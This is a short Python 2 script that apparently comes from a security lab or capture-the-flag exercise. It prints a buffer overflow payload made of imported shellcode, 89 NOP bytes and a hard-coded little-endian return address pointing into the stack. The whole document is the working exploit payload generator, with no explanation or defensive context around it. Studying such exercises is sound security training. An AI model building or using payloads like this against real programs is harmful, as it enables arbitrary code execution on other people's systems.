from shellcode import shellcode
from struct import pack

print shellcode + '\x90' * 89 + pack("<I", 0xbffef3fc)
